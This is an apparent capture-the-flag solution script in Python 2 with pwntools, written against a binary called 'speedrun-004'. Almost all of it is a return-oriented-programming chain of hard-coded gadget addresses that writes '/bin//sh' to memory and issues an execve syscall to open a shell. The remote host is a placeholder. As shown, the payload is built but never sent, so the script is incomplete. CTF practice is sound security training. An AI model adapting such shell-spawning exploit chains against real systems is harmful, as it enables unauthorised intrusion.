#!/usr/bin/env python3

from pwn import *
from struct import pack
exe = ELF("./speedrun-004")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    p = ''

    p += pack('<Q', 0x0000000000410a93) # pop rsi ; ret
    p += pack('<Q', 0x00000000006b90e0) # @ .data
    p += pack('<Q', 0x0000000000415f04) # pop rax ; ret
    p += '/bin//sh'
    p += pack('<Q', 0x000000000047f521) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x0000000000410a93) # pop rsi ; ret
    p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
    p += pack('<Q', 0x0000000000445460) # xor rax, rax ; ret
    p += pack('<Q', 0x000000000047f521) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
    p += pack('<Q', 0x00000000006b90e0) # @ .data
    p += pack('<Q', 0x0000000000410a93) # pop rsi ; ret
    p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
    p += pack('<Q', 0x000000000044a155) # pop rdx ; ret
    p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
    p += pack('<Q', 0x0000000000445460) # xor rax, rax ; ret
    p += pack('<Q', 0x0000000000415f04) # pop rax ; ret
    p += p64(0x3b)
    '''
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000474970) # add rax, 1 ; ret
    '''
    p += pack('<Q', 0x000000000047b6bf) # syscall

    print len(p)
    r.interactive()


if __name__ == "__main__":
    main()
